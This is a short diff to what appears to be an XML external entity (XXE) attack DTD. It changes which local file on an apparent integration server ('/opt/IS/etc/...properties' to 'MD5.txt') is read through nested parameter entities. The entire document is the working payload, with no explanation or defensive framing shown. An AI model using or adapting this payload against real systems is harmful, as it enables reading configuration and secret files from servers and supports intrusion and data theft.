@@ -1,4 +1,4 @@
-<!ENTITY % cfga SYSTEM "file:///opt/IS/etc/integration_unit.properties">
+<!ENTITY % cfga SYSTEM "file:///opt/IS/etc/MD5.txt">
 <!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
 %eea;
 %lobsterdata;
